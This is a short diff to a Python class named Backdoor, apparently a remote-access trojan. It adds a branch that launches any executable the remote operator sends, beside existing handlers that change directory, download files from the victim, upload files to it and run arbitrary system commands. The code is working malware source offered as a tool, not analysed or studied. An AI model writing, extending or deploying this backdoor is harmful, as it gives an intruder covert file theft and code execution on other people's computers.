@@ -60,11 +60,15 @@ class Backdoor:
 							path = path + command[x] + " "
 					else:
 						path = command[1]
+					print(path)
 					command_result = self.change_working_directory_to(path)
 				elif command[0] == "download":
 					command_result = self.read_file(command[1])
 				elif command[0] == "upload":
 					command_result = self.write_file(command[1], command[2])
+				elif len(command) == 1 and '.exe' in command[0]:
+					subprocess.Popen(command)
+					command_result = "[+] Executable is running"
 				else:
 					command_result = self.execute_system_command(command)
 			except Exception:
